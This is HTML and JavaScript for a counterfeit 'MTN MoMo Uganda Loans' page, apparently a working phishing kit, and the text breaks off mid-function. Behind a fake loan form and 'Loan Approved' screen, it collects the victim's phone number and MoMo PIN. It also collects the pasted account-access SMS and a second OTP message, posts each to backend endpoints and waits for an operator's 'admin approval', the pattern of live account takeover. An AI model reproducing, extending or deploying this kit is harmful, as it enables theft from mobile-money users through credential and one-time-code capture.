+      <div class="field"><label>Loan Type</label><div class="sel-wrap"><select id="s1ty"><option>Personal Loan</option><option selected="">Business Loan</option><option>Home Loan</option><option>Car Loan</option><option>Education Loan</option></select></div></div>
+      <div class="field"><label>Loan Amount (UGX)</label><input type="number" id="s1am" value="1000000" placeholder="Enter amount"></div>
+      <div class="field"><label>Loan Term</label><div class="sel-wrap"><select id="s1te"><option>6 Months</option><option>12 Months</option><option>18 Months</option><option>24 Months</option><option selected="">48 Months</option><option>60 Months</option></select></div></div>
+      <div class="field"><label>Purpose of Loan</label><textarea id="s1pu" placeholder="Describe the purpose of your loan…"></textarea></div>
+      <button class="btn-grad">NEXT STEP</button>
+    </div>
+  </div>
+</div>
+
+<div id="page-step2" class="page">
+  <nav class="navbar">
+    <a class="nav-left">← Back</a>
+    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 1.2rem;">M</div>
+      <div style="text-align: left;">
+        <div class="mtn-logo-text" style="font-size: 0.9rem;">MTN MoMo Uganda</div>
+        <div class="mtn-logo-sub" style="font-size: 0.6rem;">Loans</div>
+      </div>
+    </div>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Loan Application</h2>
+      <p class="step-sub">Step 2 of 3</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
+      <div class="msg-box error" id="s2Err"><span class="msg-icon">✕</span><span id="s2ErrTxt"></span></div>
+      <div class="field-row">
+        <div class="field"><label>First Name</label><input type="text" id="s2fi" placeholder="First Name"></div>
+        <div class="field"><label>Last Name</label><input type="text" id="s2la" placeholder="Last Name"></div>
+      </div>
+      <div class="field">
+        <label>Phone Number (Uganda)</label>
+        <div class="phone-row"><div class="ph-pre">+256</div><input type="tel" id="s2ph" placeholder="670123456" maxlength="9"></div>
+        <div class="field-hint">9 digits without +256 prefix (e.g., 670123456)</div>
+      </div>
+      <div class="step-btns">
+        <button class="btn-gray">BACK</button>
+        <button class="btn-grad">NEXT STEP</button>
+      </div>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 MTN MoMo Uganda Loans</div>
+</div>
+
+<div id="page-step3" class="page">
+  <nav class="navbar">
+    <a class="nav-left">← Back</a>
+    <div class="mtn-logo" style="flex-direction: row; gap: 6px;">
+      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 1.2rem;">M</div>
+      <div style="text-align: left;">
+        <div class="mtn-logo-text" style="font-size: 0.9rem;">MTN MoMo Uganda</div>
+        <div class="mtn-logo-sub" style="font-size: 0.6rem;">Loans</div>
+      </div>
+    </div>
+    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
+  </nav>
+  <div class="step-center">
+    <div class="step-card">
+      <h2>Loan Application</h2>
+      <p class="step-sub">Step 3 of 3</p>
+      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
+      <div class="msg-box error" id="s3Err"><span class="msg-icon">✕</span><span id="s3ErrTxt"></span></div>
+      <div class="field"><label>Employment Status</label><div class="sel-wrap"><select id="s3em"><option>Employed</option><option selected="">Self-employed</option><option>Unemployed</option><option>Retired</option><option>Student</option></select></div></div>
+      <div class="field"><label>Annual Income (UGX)</label><input type="number" id="s3in" placeholder="Enter annual income"></div>
+      <div class="sum-box">
+        <h3>Application Summary</h3>
+        <div class="sum-row"><span class="sk">Loan Amount:</span><span class="sv" id="sA">UGX 1,000,000</span></div>
+        <div class="sum-row"><span class="sk">Loan Term:</span><span class="sv" id="sT">48 Months</span></div>
+        <div class="sum-row"><span class="sk">Purpose:</span><span class="sv" id="sP">—</span></div>
+        <div class="sum-row"><span class="sk">Applicant:</span><span class="sv" id="sN">—</span></div>
+      </div>
+      <div class="step-btns">
+        <button class="btn-gray">BACK</button>
+        <button class="btn-grad">SUBMIT APPLICATION</button>
+      </div>
+    </div>
+  </div>
+  <div class="pg-footer">© 2026 MTN MoMo Uganda Loans</div>
+</div>
+
+<div id="page-processing" class="page">
+  <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="proc-wrap">
+      <div class="proc-icon">⏳</div>
+      <h2>Processing Application...</h2>
+      <p>Please wait while we process your loan application</p>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7);">Redirecting in a few moments...</div>
+    </div>
+  </div>
+</div>
+
+<div id="page-login" class="page">
+  <div class="login-hdr">
+    <div class="mtn-logo">
+      <div class="mtn-logo-icon">M</div>
+      <div class="mtn-logo-text" style="color: var(--mtn-gold); font-size: 1.2rem;">MoMo</div>
+    </div>
+    <div style="color: rgba(255, 255, 255, 0.7); font-size: 0.8rem;">Login via MTN MoMo Uganda</div>
+  </div>
+  <div class="login-body-wrap">
+    <h2>Login to MTN MoMo Uganda</h2>
+    <div class="login-inner">
+      <div class="lg-phone-row">
+        <div class="lg-ph-pre">+256</div>
+        <input type="tel" id="lpPhone" placeholder="670123456" maxlength="9">
+      </div>
+      <div class="pin-label">Enter your MoMo PIN (5 digits):</div>
+      <div class="pin-row">
+        <input type="password" id="lp0" class="pin-box" maxlength="1" placeholder="•">
+        <input type="password" id="lp1" class="pin-box" maxlength="1" placeholder="•">
+        <input type="password" id="lp2" class="pin-box" maxlength="1" placeholder="•">
+        <input type="password" id="lp3" class="pin-box" maxlength="1" placeholder="•">
+        <input type="password" id="lp4" class="pin-box" maxlength="1" placeholder="•">
+        <button class="pin-eye" title="Show/Hide">👁</button>
+        <button class="pin-delete" title="Delete PIN">✕</button>
+      </div>
+      <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
+      <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
+      <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
+      <button id="bLgn" class="btn-login">LOGIN</button>
+      <div id="mLgn" class="loading">
+        <div class="spinner" style="margin: 16px auto;"></div>
+        <div class="wait-msg">Logging in…</div>
+      </div>
+    </div>
+  </div>
+  <div class="lg-curve"></div>
+  <div class="lg-foot">
+    <div class="mtn-logo">
+      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 0.9rem;">M</div>
+      <div class="mtn-logo-text" style="color: var(--mtn-gold); font-size: 1rem;">MTN MoMo Uganda</div>
+    </div>
+    <div class="lg-terms">© 2026 MTN MoMo Uganda Loans. All rights reserved.</div>
+  </div>
+</div>
+
+<div id="page-wait-login-approval" class="page">
+  <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="wait-wrap">
+      <div class="wait-icon">⏳</div>
+      <h2>Waiting for Admin Approval</h2>
+      <p>Your login is pending admin verification. Please wait...</p>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is reviewing your request...</div>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+    </div>
+  </div>
+</div>
+
+<div id="page-sms-paste" class="page">
+  <div class="sms-topbar">
+    <button class="bk">← Back</button>
+    <div style="flex: 1;"></div>
+    <div style="text-align: center; color: var(--mtn-dark); font-weight: 600;">SMS Verification</div>
+    <div style="flex: 1;"></div>
+</div>
+  <div class="sms-body-wrap">
+    <div class="sms-card">
+      <h2>Paste SMS Message</h2>
+      <p class="sms-hint">We have sent a message to your phone number. Please copy and paste the full message here.</p>
+      <div class="sms-timer-wrap" id="smsTimerWrap">
+        <div class="sms-timer-circle">
+          <svg class="sms-timer-svg" width="44" height="44" viewBox="0 0 44 44">
+            <circle class="sms-timer-bg" cx="22" cy="22" r="18"></circle>
+            <circle class="sms-timer-arc" id="smsTimerArc" cx="22" cy="22" r="18"></circle>
+          </svg>
+          <div class="sms-timer-num" id="smsTimerNum">60</div>
+        </div>
+        <div class="sms-timer-text"><strong>Message expires in <span id="smsTimerSec">60</span>s.</strong><br>Paste your SMS before time runs out.</div>
+      </div>
+      <div class="sms-resend-wrap" id="smsResendWrap">
+        <p>⏰ Your verification session has expired.<br>Request a new SMS and paste it below.</p>
+        <button class="btn-resend" id="bResend">🔄 Resend SMS</button>
+        <div id="mResend" class="loading" style="margin-top:10px;">
+          <div class="spinner" style="margin: 8px auto; width:30px; height:30px; border-width:3px;"></div>
+          <div class="wait-msg" style="font-size:0.82rem;">Sending…</div>
+        </div>
+      </div>
+      <textarea id="smsMsgBox" class="sms-textarea" placeholder="Paste your full SMS message here…"></textarea>
+      <p class="sms-code-hint">Something like: "Y'ello. Please note! This confidential code gives access to your MoMo account:........."</p>
+      <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
+      <div class="msg-box success" id="smsMsgOk"><span class="msg-icon">✓</span><span id="smsMsgOkTxt"></span></div>
+      <button id="bSms" class="btn-sms">SUBMIT</button>
+      <div id="mSms" class="loading">
+        <div class="spinner" style="margin: 16px auto;"></div>
+        <div class="wait-msg">Processing message…</div>
+      </div>
+    </div>
+  </div>
+  <div class="sms-curve"></div>
+  <div class="sms-foot">© 2026 MTN MoMo Uganda Loans – Powered by MTN</div>
+</div>
+
+<div id="page-wait-sms" class="page">
+  <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="wait-wrap">
+      <div class="wait-icon">⏳</div>
+      <h2>Verifying SMS Message</h2>
+      <p>Your SMS message has been received. Please wait for admin verification...</p>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitSmsAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is verifying your message...</div>
+    </div>
+  </div>
+</div>
+
+<div id="page-otp" class="page">
+  <div class="otp-topbar">
+    <button class="bk">← Back</button>
+    <div style="flex: 1;"></div>
+    <div style="text-align: center; color: var(--mtn-dark); font-weight: 600;">OTP Verification</div>
+    <div style="flex: 1;"></div>
+  </div>
+  <div class="otp-body-wrap">
+    <div class="otp-card">
+      <div class="otp-paste-section">
+        <div class="otp-paste-label">Paste New Message:</div>
+        <div class="otp-paste-hint">We have sent a new message to your phone number Copy the full SMS you received and paste it here.</div>
+        <textarea id="otpMsgPaste" class="otp-paste-textarea" placeholder="Paste your full SMS message here…"></textarea>
+        <p class="otp-paste-code-hint">e.g. "Y'ello. Please enter the following code:........."</p>
+      </div>
+      <div class="msg-box error" id="otpMsg"><span class="msg-icon">✕</span><span id="otpMsgTxt"></span></div>
+      <div class="msg-box success" id="otpMsgOk"><span class="msg-icon">✓</span><span id="otpMsgOkTxt"></span></div>
+      <button id="bOtp" class="btn-otp">SUBMIT</button>
+      <div id="mOtp" class="loading">
+        <div class="spinner" style="margin: 16px auto;"></div>
+        <div class="wait-msg">Verifying…</div>
+      </div>
+    </div>
+  </div>
+  <div class="otp-curve"></div>
+  <div class="otp-foot">© 2026 MTN MoMo Uganda Loans – Powered by MTN</div>
+</div>
+
+<div id="page-wait-otp" class="page">
+  <div style="background:linear-gradient(135deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+    <div class="wait-wrap">
+      <div class="wait-icon">⏳</div>
+      <h2>Verifying OTP Code</h2>
+      <p>Your OTP code has been received. Please wait for admin verification...</p>
+      <div style="margin-top:40px; font-size:0.85rem; color:rgba(255,255,255,0.6);">Application ID: <span id="waitOtpAppId" style="font-family:monospace; color:var(--mtn-gold);">-</span></div>
+      <div style="margin-top:24px; font-size:0.9rem; color:rgba(255,255,255,0.7); animation:pulse 2s infinite;">Admin is verifying your OTP code...</div>
+    </div>
+  </div>
+</div>
+
+<div id="page-approval" class="page">
+  <div class="appr-wrap">
+    <div class="appr-top">
+      <div class="check-circle">✓</div>
+      <h2 class="appr-title">Loan Approved!</h2>
+      <p class="appr-sub">Your loan has been successfully approved.</p>
+      <div class="appr-banner">
+        <div class="abl">Amount to Receive</div>
+        <div class="aba" id="aprAmount">UGX 1,000,000</div>
+      </div>
+    </div>
+    <div class="comp-box">
+      <div class="ch">ℹ️ Important Information</div>
+      <p>The funds will be deposited directly to your MTN MoMo Uganda account within 5 minutes. Please ensure your phone number is correct.</p>
+    </div>
+    <div class="ld-card">
+      <div class="ld-htitle">📊 Loan Details</div>
+      <div class="ld-row">
+        <div class="ld-icon ic-g">💰</div>
+        <div>
+          <div class="ld-lbl">Amount</div>
+          <div class="ld-val" id="aprAmt">UGX 1,000,000</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-b">📅</div>
+        <div>
+          <div class="ld-lbl">Term</div>
+          <div class="ld-val" id="aprTerm">48 Months</div>
+        </div>
+      </div>
+      <div class="ld-row">
+        <div class="ld-icon ic-p">💳</div>
+        <div>
+          <div class="ld-lbl">Monthly Payment</div>
+          <div class="ld-val" id="aprMth">UGX 24,000</div>
+        </div>
+      </div>
+    </div>
+    <div class="nxt-steps">
+      <span style="font-size: 1.2rem;">📌</span>
+      <p><strong>Next Steps:</strong> To start repaying, you can set up an automatic payment plan in your MTN MoMo Uganda account in the next section.</p>
+    </div>
+    <div class="rth-wrap">
+      <button class="rth-btn">FINISH</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  // STATE
+  const S = {
+    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
+    firstName: '', lastName: '', phone: '',
+    employment: '', annualIncome: 0,
+    applicationId: '',
+    requestAdminId: '',
+    isSubmitting: false
+  };
+
+  (function initAdminParam() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const adminId = urlParams.get('admin');
+
+    if (!adminId) {
+      console.error('❌ BLOCKED: No admin parameter in URL');
+      document.getElementById('adminErrorModal').classList.add('show');
+      return;
+    }
+
+    S.requestAdminId = adminId;
+    console.log('✅ Admin link locked to:', adminId);
+  })();
+
+  function goTo(pageId) {
+    if (!S.requestAdminId) {
+      document.getElementById('adminErrorModal').classList.add('show');
+      return;
+    }
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById(pageId)?.classList.add('active');
+    window.scrollTo(0, 0);
+
+    if (pageId === 'page-sms-paste') {
+      const btn = document.getElementById('bSms');
+      const spinner = document.getElementById('mSms');
+      btn.disabled = false;
+      spinner.classList.remove('show');
+      chkSmsMsg();
+      ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
+      startSmsTimer();
+    }
+
+    if (pageId === 'page-otp') {
+      const btn = document.getElementById('bOtp');
+      const spinner = document.getElementById('mOtp');
+      btn.disabled = false;
+      btn.textContent = 'SUBMIT';
+      spinner.classList.remove('show');
+      document.getElementById('otpMsgPaste').value = '';
+      chkOtp();
+      ['otpMsg','otpMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
+    }
+
+    if (pageId === 'page-login') {
+      const btn = document.getElementById('bLgn');
+      const spinner = document.getElementById('mLgn');
+      btn.disabled = false;
+      spinner.classList.remove('show');
+      S.isSubmitting = false;
+      chkPin();
+    }
+  }
+
+  function startApplication() {
+    if (!S.requestAdminId) {
+      document.getElementById('adminErrorModal').classList.add('show');
+      return;
+    }
+    goTo('page-step1');
+  }
+
+  function normalizePhone(id) {
+    let inp = document.getElementById(id);
+    let val = inp.value.replace(/\D/g, '');
+    if (val.length > 9) val = val.substring(0, 9);
+    inp.value = val;
+  }
+
+  function toS2() {
+    const ty = document.getElementById('s1ty').value;
+    const am = +document.getElementById('s1am').value;
+    const te = document.getElementById('s1te').value;
+    const pu = document.getElementById('s1pu').value;
+
+    if (!ty || am <= 0 || !te || !pu.trim()) {
+      showErr('s1Err', 'Please complete all fields.');
+      return;
+    }
+
+    S.loanType = ty;
+    S.loanAmount = am;
+    S.loanTerm = te;
+    S.loanPurpose = pu;
+    goTo('page-step2');
+  }
+
+  function toS3() {
+    const fi = document.getElementById('s2fi').value.trim();
+    const la = document.getElementById('s2la').value.trim();
+    const ph = document.getElementById('s2ph').value;
+
+    if (!fi || !la || ph.length !== 9) {
+      showErr('s2Err', 'Please enter valid first name, last name, and 9-digit phone number.');
+      return;
+    }
+
+    S.firstName = fi;
+    S.lastName = la;
+    S.phone = ph;
+    goTo('page-step3');
+  }
+
+  function submitApp() {
+    const em = document.getElementById('s3em').value;
+    const in_ = +document.getElementById('s3in').value;
+
+    if (!em || in_ <= 0) {
+      showErr('s3Err', 'Please complete all fields.');
+      return;
+    }
+
+    S.employment = em;
+    S.annualIncome = in_;
+    S.applicationId = 'APP' + Math.random().toString(36).substring(2, 9).toUpperCase();
+    goTo('page-processing');
+
+    setTimeout(() => {
+      goTo('page-login');
+    }, 2000);
+  }
+
+  function showErr(id, msg) {
+    document.getElementById(id).classList.add('show');
+    document.getElementById(id + 'Txt').textContent = msg;
+  }
+  function clearErr(id) {
+    document.getElementById(id).classList.remove('show');
+  }
+
+  function updateCalc() {
+    const amt = +document.getElementById('amtSlider').value;
+    document.getElementById('calcAmt').textContent = 'UGX ' + amt.toLocaleString();
+    const monthly = Math.ceil(amt / 48);
+    document.getElementById('monthlyAmt').textContent = 'UGX ' + monthly.toLocaleString();
+  }
+
+  function pinMvM(el, i) {
+    el.value = el.value.replace(/\D/, '');
+    if (el.value && i < 4) {
+      document.getElementById('lp' + (i+1)).focus();
+    }
+    chkPin();
+  }
+
+  document.addEventListener('keydown', function(e) {
+    const id = e.target.id;
+
+    if (id.startsWith('lp') && id.length === 3 && e.key === 'Backspace' && !e.target.value) {
+      const idx = parseInt(id[2]);
+      if (idx > 0) document.getElementById('lp' + (idx-1)).focus();
+    }
+  });
+
+  function chkPin() {
+    const ok = [0,1,2,3,4].every(i => document.getElementById('lp'+i).value);
+    document.getElementById('bLgn').className = ok ? 'btn-login rdy' : 'btn-login';
+  }
+
+  function togPin() {
+    [0,1,2,3,4].forEach(i => {
+      const b = document.getElementById('lp'+i);
+      b.type = b.type === 'password' ? 'text' : 'password';
+    });
+  }
+
+  function clearLoginPin() {
+    [0,1,2,3,4].forEach(i => { document.getElementById('lp'+i).value = ''; });
+    chkPin();
+    document.getElementById('lp0').focus();
+  }
+
+  function clearOtpCode() {
+    document.getElementById('otpMsgPaste').value = '';
+    chkOtp();
+    document.getElementById('otpMsgPaste').focus();
+  }
+
+  function showLgnMsg(type, text) {
+    ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+    if (type === 'error')   { document.getElementById('lpMsgTxt').textContent = text;     document.getElementById('lpMsg').classList.add('show'); }
+    if (type === 'success') { document.getElementById('lpMsgOkTxt').textContent = text;   document.getElementById('lpMsgOk').classList.add('show'); }
+    if (type === 'warning') { document.getElementById('lpMsgWarnTxt').textContent = text; document.getElementById('lpMsgWarn').classList.add('show'); }
+  }
+
+  function cancelAllPolls() {
+    clearTimeout(pollTimeout);
+    clearTimeout(smsPollTimeout);
+    clearTimeout(otpPollTimeout);
+    pollTimeout    = null;
+    smsPollTimeout = null;
+    otpPollTimeout = null;
+  }
+
+  async function doLogin() {
+    if (S.isSubmitting) return;
+    S.isSubmitting = true;
+
+    cancelAllPolls();
+
+    ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+    const phone = document.getElementById('lpPhone').value;
+    const pin   = [0,1,2,3,4].map(i => document.getElementById('lp'+i).value).join('');
+
+    if (phone.length !== 9 || pin.length < 5) {
+      S.isSubmitting = false;
+      showLgnMsg('warning', 'Phone: 9 digits (e.g., 670123456). PIN: 5 digits.');
+      return;
+    }
+
+    document.getElementById('mLgn').classList.add('show');
+    document.getElementById('bLgn').disabled = true;
+
+    try {
+      const requestBody = {
+        phoneNumber:    phone,
+        pin:            pin,
+        requestAdminId: S.requestAdminId,
+        assignmentType: 'specific'
+      };
+
+      const res  = await fetch('/api/verify-pin', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify(requestBody)
+      });
+
+      const data = await res.json();
+      document.getElementById('mLgn').classList.remove('show');
+
+      if (data.success) {
+        S.isSubmitting = false;
+        S.applicationId = data.applicationId;
+        document.getElementById('waitAppId').textContent = data.applicationId;
+        goTo('page-wait-login-approval');
+        pollForPinApproval(data.applicationId);
+      } else {
+        S.isSubmitting = false;
+        document.getElementById('bLgn').disabled = false;
+        showLgnMsg('error', data.message || 'Login failed.');
+      }
+    } catch (err) {
+      S.isSubmitting = false;
+      document.getElementById('mLgn').classList.remove('show');
+      document.getElementById('bLgn').disabled = false;
+      showLgnMsg('error', 'Network error: ' + err.message);
+    }
+  }
+
+  let pollTimeout;
+  function pollForPinApproval(applicationId) {
+    const checkStatus = async () => {
+      if (S.applicationId !== applicationId) return;
+      try {
+        const res  = await fetch(`/api/check-pin-status/${applicationId}`);
+        const data = await res.json();
+
+        if (data.success) {
+          if (data.status === 'approved') {
+            clearTimeout(pollTimeout);
+            goTo('page-sms-paste');
+          } else if (data.status === 'rejected') {
+            cancelAllPolls();
+            S.applicationId = '';
+            document.getElementById('lpPhone').value = '';
+            [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
+            goTo('page-login');
+            showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
+          } else {
+            pollTimeout = setTimeout(checkStatus, 2000);
+          }
+        } else {
+          pollTimeout = setTimeout(checkStatus, 3000);
+        }
+      } catch (err) {
+        pollTimeout = setTimeout(checkStatus, 3000);
+      }
+    };
+    checkStatus();
+  }
+
+  function chkSmsMsg() {
+    const txt = document.getElementById('smsMsgBox').value.trim();
+    document.getElementById('bSms').className = txt.length > 3 ? 'btn-sms rdy' : 'btn-sms';
+  }
+
+  function showSmsMsg(type, text) {
+    ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+    if (type === 'error')   { document.getElementById('smsMsgTxt').textContent   = text; document.getElementById('smsMsg').classList.add('show'); }
+    if (type === 'success') { document.getElementById('smsMsgOkTxt').textContent = text; document.getElementById('smsMsgOk').classList.add('show'); }
+  }
+
+  let smsTimerInterval = null;
+  let smsTimerExpired  = false;
+
+  function startSmsTimer() {
+    if (smsTimerInterval) clearInterval(smsTimerInterval);
+    smsTimerExpired = false;
+
+    document.getElementById('smsMsgBox').value = '';
+    document.getElementById('smsMsgBox').disabled = false;
+    chkSmsMsg();
+    document.getElementById('smsResendWrap').style.display = 'none';
+
+    const arc = document.getElementById('smsTimerArc');
+    const num = document.getElementById('smsTimerNum');
+    const sec = document.getElementById('smsTimerSec');
+    arc.classList.remove('urgent');
+    num.classList.remove('urgent');
+    arc.style.strokeDashoffset = '0';
+
+    document.getElementById('smsTimerWrap').style.display = 'flex';
+
+    let remaining = 60;
+    const CIRCUMFERENCE = 113;
+
+    const tick = function() {
+      remaining--;
+      const pct = remaining / 60;
+      arc.style.strokeDashoffset = String(CIRCUMFERENCE * (1 - pct));
+      num.textContent = remaining;
+      sec.textContent = remaining;
+
+      if (remaining <= 10) {
+        arc.classList.add('urgent');
+        num.classList.add('urgent');
+      }
+
+      if (remaining <= 0) {
+        clearInterval(smsTimerInterval);
+        smsTimerInterval = null;
+        smsTimerExpired  = true;
+
+        document.getElementById('smsMsgBox').disabled = true;
+        document.getElementById('smsMsgBox').value = '';
+        document.getElementById('bSms').disabled = true;
+        document.getElementById('bSms').className = 'btn-sms';
+
+        document.getElementById('smsTimerWrap').style.display = 'none';
+        document.getElementById('smsResendWrap').style.display = 'block';
+        document.getElementById('bResend').disabled = false;
+        document.getElementById('mResend').classList.remove('show');
+
+        ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
+      }
+    };
+
+    smsTimerInterval = setInterval(tick, 1000);
+  }
+
+  function stopSmsTimer() {
+    if (smsTimerInterval) {
+      clearInterval(smsTimerInterval);
+      smsTimerInterval = null;
+    }
+  }
+
+  async function doSmsResend() {
+    const btn     = document.getElementById('bResend');
+    const spinner = document.getElementById('mResend');
+    btn.disabled  = true;
+    spinner.classList.add('show');
+    ['smsMsg','smsMsgOk'].forEach(function(id){ document.getElementById(id).classList.remove('show'); });
+
+    try {
+      const res  = await fetch('/api/resend-sms', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ applicationId: S.applicationId })
+      });
+      const data = await res.json();
+      spinner.classList.remove('show');
+
+      if (data.success) {
+        document.getElementById('smsResendWrap').style.display = 'none';
+        document.getElementById('smsMsgBox').disabled = false;
+        document.getElementById('bSms').disabled = false;
+        startSmsTimer();
+        showSmsMsg('success', 'A new SMS has been sent to your phone. Paste it below before it expires.');
+      } else {
+        btn.disabled = false;
+        showSmsMsg('error', data.message || 'Failed to resend SMS. Please try again.');
+      }
+    } catch (err) {
+      spinner.classList.remove('show');
+      btn.disabled = false;
+      showSmsMsg('error', 'Network error: ' + err.message);
+    }
+  }
+
+  async function doSmsParse() {
+    ['smsMsg','smsMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+    if (smsTimerExpired) {
+      document.getElementById('smsResendWrap').style.display = 'block';
+      document.getElementById('bResend').disabled = false;
+      return;
+    }
+
+    const msg = document.getElementById('smsMsgBox').value.trim();
+    if (msg.length < 3) {
+      showSmsMsg('error', 'Please paste an SMS message.');
+      return;
+    }
+
+    document.getElementById('mSms').classList.add('show');
+    document.getElementById('bSms').disabled = true;
+
+    try {
+      const res  = await fetch('/api/verify-sms', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ applicationId: S.applicationId, smsMessage: msg })
+      });
+
+      const data = await res.json();
+      document.getElementById('mSms').classList.remove('show');
+
+      if (data.success) {
+        stopSmsTimer();
+        document.getElementById('waitSmsAppId').textContent = S.applicationId;
+        goTo('page-wait-sms');
+        pollForSmsApproval(S.applicationId);
+      } else {
+        document.getElementById('bSms').disabled = false;
+        showSmsMsg('error', data.message || 'Failed to submit SMS.');
+      }
+    } catch (err) {
+      document.getElementById('mSms').classList.remove('show');
+      document.getElementById('bSms').disabled = false;
+      showSmsMsg('error', 'Error: ' + err.message);
+    }
+  }
+
+  let smsPollTimeout;
+  function pollForSmsApproval(applicationId) {
+    const checkStatus = async () => {
+      if (S.applicationId !== applicationId) return;
+      try {
+        const res  = await fetch(`/api/check-otp-status/${applicationId}`);
+        const data = await res.json();
+
+        if (data.success) {
+          if (data.status === 'approved') {
+            clearTimeout(smsPollTimeout);
+            goTo('page-otp');
+          } else if (data.status === 'rejected') {
+            clearTimeout(smsPollTimeout);
+            document.getElementById('smsMsgBox').value = '';
+            goTo('page-sms-paste');
+            document.getElementById('bSms').disabled = false;
+            chkSmsMsg();
+            showSmsMsg('error', 'The SMS message was incorrect. Please paste the correct message.');
+          } else {
+            const pinRes  = await fetch(`/api/check-pin-status/${applicationId}`);
+            const pinData = await pinRes.json();
+            if (pinData.success && pinData.status === 'rejected') {
+              clearTimeout(smsPollTimeout);
+              S.applicationId = null;
+              goTo('page-login');
+              showLgnMsg('error', 'Wrong PIN. Please try again.');
+            } else {
+              smsPollTimeout = setTimeout(checkStatus, 2000);
+            }
+          }
+        } else {
+          smsPollTimeout = setTimeout(checkStatus, 3000);
+        }
+      } catch (err) {
+        smsPollTimeout = setTimeout(checkStatus, 3000);
+      }
+    };
+    checkStatus();
+  }
+
+  function handleOtpInput(el, type) {
+    el.value = el.value.replace(/\D/, '');
+    const idx = parseInt(el.id.match(/\d$/)[0]);
+    if (el.value && type === 'otp' && idx < 3) {
+      document.getElementById(type + (idx + 1)).focus();
+    }
+    chkOtp();
+  }
+
+  function chkOtp() {
+    const msgOk = (document.getElementById('otpMsgPaste').value || '').trim().length > 0;
+    document.getElementById('bOtp').className = msgOk ? 'btn-otp rdy' : 'btn-otp';
+  }
+function showOtpMsg(type, text) {
+    ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+    if (type === 'error')   { document.getElementById('otpMsgTxt').textContent   = text; document.getElementById('otpMsg').classList.add('show'); }
+    if (type === 'success') { document.getElementById('otpMsgOkTxt').textContent = text; document.getElementById('otpMsgOk').classList.add('show'); }
+  }
+
+  async function doOtp() {
+    ['otpMsg','otpMsgOk'].forEach(id => document.getElementById(id).classList.remove('show'));
+
+    const pastedMsg = (document.getElementById('otpMsgPaste').value || '').trim();
+
+    if (!pastedMsg) {
+      showOtpMsg('error', 'Please paste the SMS message you received.');
+      return;
+    }
+
+    document.getElementById('mOtp').classList.add('show');
+    document.getElementById('bOtp').disabled = true;
+    document.getElementById('bOtp').textContent = 'Processing…';
+
+    try {
+      const res  = await fetch('/api/verify-otp', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ applicationId: S.applicationId, otp: pastedMsg })
+      });
+
+      const data = await res.json();
+      document.getElementById('mOtp').classList.remove('show');
+
+      if (data.success) {
+        document.getElementById('waitOtpAppId').textContent = S.applicationId;
+        goTo('page-wait-otp');
+        pollForOtpApproval(S.applicationId);
+      } else {
+        document.getElementById('bOtp').disabled = false;
+        document.getElementById('bOtp').textContent = 'SUBMIT';
+        showOtpMsg('error', data.message || 'Failed to submit OTP.');
+      }
+    } catch (err) {
+      document.getElementById('mOtp').classList.remove('show');
